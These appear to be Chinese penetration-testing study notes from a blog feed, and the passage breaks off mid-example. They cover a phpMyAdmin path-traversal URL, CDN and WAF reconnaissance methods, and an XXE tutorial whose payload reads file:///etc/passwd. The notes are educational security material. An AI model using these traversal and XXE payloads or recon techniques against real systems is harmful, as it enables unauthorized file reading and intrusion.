docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623123783733-3cba9200-6e65-4115-b589-0b777315382c.png" alt="img"></p><p>成功访问phpmyadmin之后，访问<code>http://10.1.1.133:8080/?target=db_sql.php%3f/../../../../../../../../etc/passwd</code>实现漏洞利用，得到执行etc&#x2F;passwd的结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623123853171-a2f0af6d-42bd-483d-a96e-02c553f0f297.png" alt="image.png"></p></li></ul><h2 id="6-加密编码算法"><a href="#6-加密编码算法" class="headerlink" title="6. 加密编码算法"></a>6. 加密编码算法</h2><ul><li><p>时间戳</p><p>在线转换工具：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p></li><li><p>URL编码</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725211231394.png" alt="image-20220725211231394"></p></li><li><p>base64编码</p><p>随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号。</p></li><li><p>unescape编码</p><p>和URL编码有点像，特点是一般是%U+四个数字对应着两个字符，主要运用于网站web应用。</p></li><li><p>AES加密</p></li></ul><h2 id="7-x3D-x3D-CDN绕过-x3D-x3D"><a href="#7-x3D-x3D-CDN绕过-x3D-x3D" class="headerlink" title="7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;"></a>7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;</h2><p>CDN依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><ul><li><p>判断是否存在CDN服务</p><p>利用多节点技术进行请求返回判断<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><p>验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。</p><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>cdn网站</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p></li><li><p>CDN对安全测试的影响</p><p>CDN会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</p></li><li><p>目前常见的CDN绕过技术</p><p><strong>子域名查询</strong></p><p>因为有些主站是做了CDN服务而子站是没有做CDN服务</p><p><strong>邮件服务查询</strong></p><p>因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。</p><p><strong>国外地址请求</strong></p><p>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</p><p><strong>遗留文件、扫描全网</strong></p><p>如PHPinfo信息当中会遗留出ip地址</p><p><strong>黑暗引擎搜索</strong></p><p>fofa、傻蛋、谛听、zoomeye、censys</p><p><strong>特定文件dns历史记录，以量打量</strong></p><p>CDN真实IP地址获取后绑定指向地址，即更改本地HOSTS解析指向文件</p><p><strong>奇淫技巧</strong></p><p>fackcdn、w8fuckcdn、zmap</p><p><strong>借助漏洞</strong></p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p></li></ul><h2 id="8-信息收集、WAF"><a href="#8-信息收集、WAF" class="headerlink" title="8. 信息收集、WAF"></a>8. 信息收集、WAF</h2><h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ul><li><p>目录型站点</p><p>主站上面存在其他的cms程序。</p><p>比如学生网站<a href="http://www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。">www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。</a></p></li><li><p>端口类站点</p><p>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口。</p></li><li><p>子域名站点</p><p>比如bbs.goodlift.net是goodlift.net的子域名，且为不同的站点。</p><p>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p></li><li><p>类似域名站点</p><p>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息。</p></li><li><p>旁注，c段站点</p><p><strong>旁注</strong>：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</p><p><strong>C段</strong>：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段，最终拿下服务器，然后通过内网渗透的方式拿下渗透服务器。</p><p>查询服务器上站点：在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p></li><li><p>搭建软件特征站点</p><p>有的网站是借助于第三方的集成搭建工具实现，例如：PHPstudy、宝塔等环境。这样的集成环境搭建的危害就是泄露了详细的版本信息。</p><p>phpstudy搭建了之后，在默认的站点安装了phpmyadmin。有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入。</p></li></ul><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p><strong>识别WAF的存在</strong>：直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问，针对不同的厂商的waf可能存在着不同的绕过思路。</p><ul><li><p>采用工具wafwoof，缺点是并不特别准确</p><p>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unzip wafw00f-master.zip      <span class="comment"># 解压</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3.8 setup.py install    <span class="comment"># 安装</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -ld wafw00f</span></span><br><span class="line">drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> wafw00f</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python main.py https://www.hlszsb.com/   <span class="comment"># 识别网站https://www.hlszsb.com/</span></span></span><br><span class="line"></span><br><span class="line">[*] Checking https://www.hlszsb.com/</span><br><span class="line">[+] Generic Detection results:</span><br><span class="line">[-] No WAF detected by the generic detection</span><br><span class="line">[~] Number of requests: 7</span><br></pre></td></tr></table></figure></li><li><p>identYwaf</p><p>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><p>与wafwoof相比运行速度慢，但是比较稳定</p></li><li><p>在有些网站的请求信息当中留下了waf的相关信息</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725213558764.png" alt="image-20220725213558764"></p></li><li><p>nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detect</span><br></pre></td></tr></table></figure></li></ul><h2 id="7-资产收集"><a href="#7-资产收集" class="headerlink" title="7. 资产收集"></a>7. 资产收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Github监控</span><br><span class="line">  便于收集整理最新exp或poc</span><br><span class="line">  便于发现相关测试目标的资产</span><br><span class="line">  server酱：http://sc.ftqq.com/3.version</span><br><span class="line">  GitHub项目监控地址：https://github.com/weixiao9188/wechat_push</span><br><span class="line"></span><br><span class="line"># 各种子域名查询</span><br><span class="line"># DNS,备案,证书</span><br><span class="line"># 全球节点请求cdn</span><br><span class="line">  枚举爆破或解析子域名对应</span><br><span class="line">  便于发现管理员相关的注册信息</span><br><span class="line"></span><br><span class="line">#黑暗引擎相关搜索</span><br><span class="line">fofa, shodan, zoomeye</span><br><span class="line">  </span><br><span class="line">#微信公众号接口获取</span><br><span class="line"># 内部群内部资源</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623572333231-e96bd343-8744-4813-97f1-b8de7edc3eb7.png?x-oss-process=image/resize,w_720,limit_0" alt="image.png"></p><h2 id="8-web漏洞"><a href="#8-web漏洞" class="headerlink" title="8. web漏洞"></a>8. web漏洞</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725233424804.png" alt="image-20220725233424804"></p><p><strong>漏洞危害情况</strong></p><ol><li><p>获取网站的数据库的权限（数据），后台账号和密码—SQL注入</p></li><li><p>直接获取网站权限—文件上传</p></li></ol><p><strong>漏洞等级划分</strong></p><ol><li><p>高危：文件上传、SQL注入、代码执行、文件包含、未授权访问</p></li><li><p>中危：逻辑安全、目录遍历</p></li><li><p>低危：信息泄露—源码、部分账号密码</p></li></ol><p><strong>漏洞重点内容</strong></p><ol><li><p>CTF：SQL注入、反序列化、代码执行</p></li><li><p>SRC：以上都有，逻辑安全</p></li><li><p>红蓝对抗：高危漏洞—权限</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础概念与信息收集&quot;&gt;&lt;a href=&quot;#基础概念与信息收集&quot; class=&quot;headerlink&quot; title=&quot;基础概念与信息收集&quot;&gt;&lt;/a&gt;基础概念与信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/20</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://frankcao3.github.io/posts/57467"/>
    <id>https://frankcao3.github.io/posts/57467</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:01:29.052Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w">https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w</a></p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123818066">https://blog.csdn.net/huangyongkang666/article/details/123818066</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XML外部实体注入(XML External Entity) 简称XXE漏洞。</p><h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><h4 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h4><p> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- XML声明 --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- DTD文档类型定义（可选） --&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 文档元素 --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>XML 是一种很像HTML的标记语言。<br>XML 的设计宗旨是 <strong>传输数据</strong>，而不是显示数据。<br>XML 标签没有被预定义。需要<strong>自行定义标签</strong>。<br>XML 被设计为具有自我描述性。</p><h4 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h4><p>XML 被设计用来<u>传输和存储数据</u>，其焦点是数据的内容。</p><p>HTML 被设计用来<u>显示数据</u>，其焦点是数据的外观。</p><h4 id="XML-用途"><a href="#XML-用途" class="headerlink" title="XML 用途"></a>XML 用途</h4><p>XML 把数据从 HTML 分离<br>XML 简化数据共享<br>XML 简化数据传输<br>XML 简化平台变更<br>XML 用于创建新的互联网语言</p><h4 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h4><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）;</p><p>下一行<code>&lt;note&gt;</code>描述文档的<strong>根元素</strong>（像在说：“本文档是一个便签”）;</p><p>接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body）</p><p><strong>注意</strong>：<em>XML 文档必须包含根元素。该元素是所有其他元素的父元素。</em></p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。所有的元素都可以有子元素。</p><h4 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h4><ol><li><p><strong>XML 必须包含根元素，它是所有其他元素的父元素</strong></p></li><li><p><strong>XML 声明文件的可选部分，如果存在需要放在文档的第一行</strong></p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p></li><li><p><strong>所有的 XML 元素都必须有一个关闭标签</strong>，在 HTML 中，某些元素的关闭标签不是必须的，比如<code>&lt;p&gt;</code>。</p></li><li><p><strong>XML 标签对大小写敏感</strong></p></li><li><p><strong>XML 必须正确嵌套</strong>，也就是标签的嵌套顺序要正确。</p><p><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</code></p></li><li><p><strong>XML 属性值必须加引号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;note date=&quot;12/11/2007&quot;&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>实体引用</strong></p><p>在 XML 中，一些字符拥有特殊的意义</p><p>在 XML 中，有 5 个预定义的实体引用:</p></li></ol><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td><td>greater than</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td><td>ampersand</td></tr><tr><td><code>&amp;apos;</code></td><td>’</td><td>apostrophe</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td><td>quotation mark</td></tr></tbody></table><ol start="8"><li><p><strong>XML 中的注释</strong></p><p><code>&lt;!-- This is a comment --&gt;</code></p></li><li><p><strong>在 XML 中，空格会被保留</strong></p><p>但是 HTML 会把多个连续的空格字符裁减（合并）为一个：</p></li><li><p><strong>XML 以 LF 存储换行</strong></p><p>在 Windows 应用程序中，换行通常以一对字符来存储：<strong>回车符（CR）和换行符（LF）</strong>。</p><p>在 Unix 和 Mac OSX 中，使用 <strong>LF</strong> 来存储新行。</p><p>在旧的 Mac 系统中，使用 <strong>CR</strong> 来存储新行。</p><p>XML 以 <strong>LF</strong> 存储换行。</p></li><li><p><strong>XML 元素</strong></p><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。XML 元素是可扩展的。</p><p>比如<code>&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;</code>。</p></li><li><p><strong>XML 属性</strong></p><p>XML元素具有属性，类似 HTML。属性（Attribute）提供有关元素的额外信息。</p><p>属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要。</p><p>比如：<code>&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt;</code>、<code>&lt;img src=&quot;computer.gif&quot; /&gt;</code>。</p><p><strong>XML 属性必须加引号</strong></p><ul><li>属性不能包含多个值（元素可以）</li><li>属性不能包含树结构（元素可以）</li><li>属性不容易扩展（为未来的变化）</li></ul><p>属性难以阅读和维护。请尽量使用元素来描述数据。而仅仅使用属性来提供与数据无关的信息。</p></li></ol><h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义（DTD）可<strong>定义合法的XML文档构建模块</strong>。它使用一系列合法的元素来<strong>定义文档的结构</strong>。 </p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="XML内部的-DOCTYPE-声明"><a href="#XML内部的-DOCTYPE-声明" class="headerlink" title="XML内部的 DOCTYPE 声明"></a>XML内部的 DOCTYPE 声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h4 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h4><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p>XML中定义 DOCTYPE 的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比如，有如下note元素，其中第一行代码表示note元素的DTD声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>note.dtd文件的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h4 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h4><p><strong>dtd中的实体是用来定义普通文本的变量。</strong>可分为一般实体和参数实体</p><ol><li><p>一般实体的声明语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>&amp;实体名;</code></strong></p></li><li><p>参数实体<strong>只能在DTD中使用</strong>，参数实体的声明格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>%实体名;</code></strong></p></li></ol><h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><p><strong>dtd中的实体被声明为内部字符数据（普通文本）</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><p><strong>dtd中的实体被声明为远程&#x2F;外部文本文件</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="PCDATA-简介"><a href="#PCDATA-简介" class="headerlink" title="PCDATA 简介"></a>PCDATA 简介</h4><p>PCDATA 的意思是被解析的<strong>字符数据</strong>（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p>PCDATA 是<strong>会被解析器解析的文本</strong>。这些文本将被解析器检查实体以及标记。</p><p>文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><h4 id="CDATA简介"><a href="#CDATA简介" class="headerlink" title="CDATA简介"></a>CDATA简介</h4><p>CDATA 的意思是<strong>字符数据</strong>（character data）。</p><p>CDATA 是<strong>不会被解析器解析的文本</strong>。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p> XXE 漏洞全称XML External Entity Injection，即 XML 外部实体注入漏洞，XXE 漏洞发生<strong>在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</strong>，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>xxe漏洞触发的点往往是<strong>可以上传xml文件的位置，没有对上传的xml文件进行过滤</strong>，导致可上传恶意 xml文件。</p><h2 id="XXE-攻击方式"><a href="#XXE-攻击方式" class="headerlink" title="XXE 攻击方式"></a>XXE 攻击方式</h2><h3 id="构建外部实体注入方法"><a href="#构建外部实体注入方法" class="headerlink" title="构建外部实体注入方法"></a>构建外部实体注入方法</h3><h4 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过<u>DTD外部实体</u>声明</h4><p><u>在XML文档内直接声明外部实体。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><h4 id="先引入外部DTD文档，再引入外部实体声明"><a href="#先引入外部DTD文档，再引入外部实体声明" class="headerlink" title="先引入外部DTD文档，再引入外部实体声明"></a>先引入<u>外部DTD文档</u>，再引入<u>外部实体</u>声明</h4><p><u>在XML文档内直接引入外部文档，再在外部文档内引入外部实体。</u></p><p>XML 文件内容（包含DTD外部文档）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM 